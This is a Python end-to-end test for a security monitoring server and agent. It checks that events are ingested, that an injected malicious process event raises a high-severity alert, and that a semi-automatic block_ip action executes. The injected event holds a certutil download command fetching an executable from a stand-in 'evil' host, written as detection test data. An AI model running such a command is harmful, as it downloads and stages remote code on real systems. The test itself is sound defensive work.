from __future__ import annotations

import socket
import tempfile
import threading
import time
from pathlib import Path

import httpx
import uvicorn

from argos.agent.runner import collect_all, send_to_server
from argos.agent.sources.fim import FimStore
from argos.agent.sources.usb import UsbTracker
from argos.config import Config, SwitchLevel
from argos.ocsf import EventCategory, OcsfEvent, Severity
from argos.server import create_app


def _free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def _wait_health(base: str, timeout: float = 10.0) -> None:
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            if httpx.get(f"{base}/api/v1/health", timeout=2).status_code == 200:
                return
        except Exception:
            pass
        time.sleep(0.1)
    raise RuntimeError("server health timeout")


def test_e2e_server_agent_and_proposal(tmp_path):
    data = tmp_path / "data"
    data.mkdir()
    cfg = Config()
    cfg.data_dir = data
    cfg.require_auth = False
    cfg.server_host = "127.0.0.1"
    port = _free_port()
    cfg.server_port = port
    app = create_app(cfg)
    ctx = app.state.ctx

    server = uvicorn.Server(uvicorn.Config(app, host="127.0.0.1", port=port, log_level="warning"))
    t = threading.Thread(target=server.run, daemon=True)
    t.start()
    base = f"http://127.0.0.1:{port}"
    try:
        _wait_health(base)
        # 1) El agente recolecta eventos reales y los envia al servidor por HTTP
        agent_data = tmp_path / "agent"
        agent_data.mkdir()
        agent_cfg = Config()
        agent_cfg.data_dir = agent_data
        agent_cfg.server_host = "127.0.0.1"
        agent_cfg.server_port = port
        agent_cfg.agent_sources = ["process", "network"]
        fim = FimStore(agent_data / "fim.db")
        usb = UsbTracker(agent_data / "usb.db")
        host = "e2e-host"
        events = collect_all(host, agent_cfg, fim, usb)
        assert send_to_server(agent_cfg, events), "el agente no pudo enviar al servidor"
        assert httpx.get(f"{base}/api/v1/health", timeout=2).json()["events"] >= 1

        # 2) Inyectar evento malicioso que dispara alerta HIGH
        mal = [OcsfEvent(category=EventCategory.PROCESS, host=host, source="test",
                         process_image=r"C:\Windows\System32\certutil.exe",
                         process_cmdline="certutil.exe -urlcache -f http://evil/m.exe",
                         attack_id="T1218").model_dump()]
        r = httpx.post(f"{base}/api/v1/ingest", json={"events": mal}, timeout=5)
        assert r.status_code == 200

        # 3) La alerta aparece
        alerts = []
        deadline = time.time() + 5
        while time.time() < deadline:
            alerts = httpx.get(f"{base}/api/v1/alerts", timeout=2).json()
            if any(a.get("severity") in ("high", "critical") for a in alerts):
                break
            time.sleep(0.1)
        assert any(a.get("severity") in ("high", "critical") for a in alerts)

        # 4) Propuesta bajo SEMI_AUTO se ejecuta (block_ip es bajo riesgo)
        ctx.response.set_level(SwitchLevel.SEMI_AUTO)
        pr = httpx.post(f"{base}/api/v1/propose",
                        json={"action": "block_ip", "target": "185.220.101.1", "proposed_by": "e2e"},
                        timeout=5)
        assert pr.status_code == 200
        assert pr.json()["status"] == "executed"
    finally:
        server.should_exit = True
        t.join(timeout=5)
